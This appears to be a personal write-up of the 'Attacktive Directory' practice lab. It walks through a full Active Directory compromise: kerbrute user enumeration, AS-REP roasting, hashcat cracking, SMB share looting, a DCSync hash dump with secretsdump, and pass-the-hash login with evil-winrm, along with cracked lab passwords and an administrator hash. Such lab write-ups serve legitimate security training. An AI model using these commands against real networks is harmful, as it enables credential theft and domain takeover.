<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>attacktive directory</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>attacktive directory</h1><br/><strong>Attactive Directory</strong><br /><br />Find Open Ports Using Rustscan:<br /><br />rustscan -a 10.10.11.113<br /><br /><a href=""><img src="images/151-1.png" alt="images/151-1.png" /></a><br /><br /><br />Use the available port information to do a nmap scan on those specific ports.<br /><br />We will enumerate the samba using <strong>enum4linux</strong><br /><br /><strong>enum4linux -a 10.10.11.113</strong><br /><br /><br /><a href=""><img src="images/151-2.png" alt="images/151-2.png" /></a><br /><br /><br />It will enumerate all the users and shares possible.<br />The <strong>share</strong> isn&#39;t accessible for view even using <strong>smbclient</strong>.<br /><br />However, <strong>enum4linux</strong> provided us with <strong>Local</strong> users and groups.<br /><br /><a href=""><img src="images/151-3.png" alt="images/151-3.png" /></a><br /><br />Next we use <strong>kerbrute</strong> for <strong>domain</strong> user scanning.<br /><br /><strong>https://github.com/ropnop/kerbrute/releases</strong><br /><strong>Note:</strong> Kerbrute uses a wordlist to brute force and check for users.<br /><br />Kerbrute has three main commands:<br /><br />    bruteuser - Bruteforce a single user&#39;s password from a wordlist<br />    bruteforce - Read username:password combos from a file or stdin and test them<br />    passwordspray - Test a single password against a list of users<br />    userenum - Enumerate valid domain usernames via Kerberos<br /><br />A domain (-d) or a domain controller (--dc) must be specified. If a Domain Controller is not given the KDC will be looked up via DNS.<br />By default, Kerbrute is multithreaded and uses 10 threads. This can be changed with the -t option.<br />Output is logged to stdout, but a log file can be specified with -o.<br />By default, failures are not logged, but that can be changed with -v.<br /><br />Lastly, Kerbrute has a --safe option. When this option is enabled, if an account comes back as locked out, it will abort all threads to stop locking out any other accounts.<br /><br />The help command can be used for more information<br /><br /><br /><strong>/home/cybex/lab/AppImages/kerbrute_linux_amd64 userenum --dc 10.10.11.113 -d spookysec.local -t 100 user.txt</strong><br /><br /><a href=""><img src="images/151-4.png" alt="images/151-4.png" /></a><br /><br /><br /><strong>Exploiting AS-REP Roasting using impacket</strong><br /><strong>&quot;GetNPUsers.py&quot;</strong> (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that&#39;s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.<br /><br /><strong>Note:</strong> ASReproasting occurs when a user account has the privilege &quot;<strong>Does not require Pre-Authentication</strong>&quot; set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.<br /><br />We can try with individual usernames:<br /><br /><strong>impacket-GetNPUsers spookysec.local/administrator -no-pass -dc-ip 10.10.11.113</strong><br /><br /><a href=""><img src="images/151-5.png" alt="images/151-5.png" /></a><br /><br />Or we can give a user file.<br /><br /><strong>impacket-GetNPUsers spookysec.local/ -no-pass -usersfile userfile.txt -dc-ip 10.10.11.113</strong><br /><br /><a href=""><img src="images/151-6.png" alt="images/151-6.png" /></a><br /><br />We see that <strong>svc-admin</strong> has &quot;<strong>Does not require Pre-Authentication</strong>&quot; set.<br /><br />Next we try to crack the password for svc-admin using hashcat.<br /><br /><strong>hashcat -m 18200 hashfile.txt passwords.txt</strong><br /><br /><strong>We used -m 18200 for AS-Rep Roasting</strong><br /><br />The password was found to be : <strong>management2005</strong><br /><br /><strong>Username: svc-admin<br />Password: management2005</strong><br /><br /><br />Next, Now we have a username and password in the domain. Lets try to enumerate samba using these credentials.<br /><br /><strong>smbclient -L \\10.10.11.113 -U svc-admin<br />Use Password: management2005</strong><br /><br /><br /><a href=""><img src="images/151-7.png" alt="images/151-7.png" /></a>&#39;&#39;&#39;<br /><br />We can now access the samba share <strong>backup</strong> and found the following.<br /><br /><strong>smbclient //10.10.11.113/backup -U svc-admin</strong><br /><br /><a href=""><img src="images/151-8.png" alt="images/151-8.png" /></a><br /><br />The contens of the file.<br /><br /><a href=""><img src="images/151-9.png" alt="images/151-9.png" /></a><br /><br />It sseems to be base64 encoded. So we decode it.<br /><br /><a href=""><img src="images/151-10.png" alt="images/151-10.png" /></a><br /><br />We find another credential.<br /><strong>Username: backup<br />Password: backup2517860</strong><br /><br />Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account &quot;backup&quot; gets us thinking. What is this the backup account to?<br /><br />Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes<br /><br />(<strong>Note:</strong> We can check it by rdp into machine using the backup account)<br /><br /><a href="https://blog.spookysec.net/img/dcsync.png"><img src="images/151-11.png" alt="images/151-11.png" /></a><br /><br /><br />Knowing this, we can use another tool within Impacket called &quot;<strong>secretsdump.py</strong>&quot;. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.<br /><br /><strong>impacket-secretsdump -just-dc backup:backup2517860@10.10.11.113 </strong><br /><br /><a href=""><img src="images/151-12.png" alt="images/151-12.png" /></a><br /><br />Now, we can use <strong>Pass the Hash attack</strong> with <strong>evil-winrm</strong> to use the hash to login as administrator.<br /><br /><strong>evil-winrm -i 10.10.11.113 -u administrator -H 0e0363213e37b94221497260b0bcb4fc</strong><br /><br /><a href=""><img src="images/151-13.png" alt="images/151-13.png" /></a><br /><br />Thus we have full access to the domain.<br /><br />Thanks!!</div>
</body>
</html>
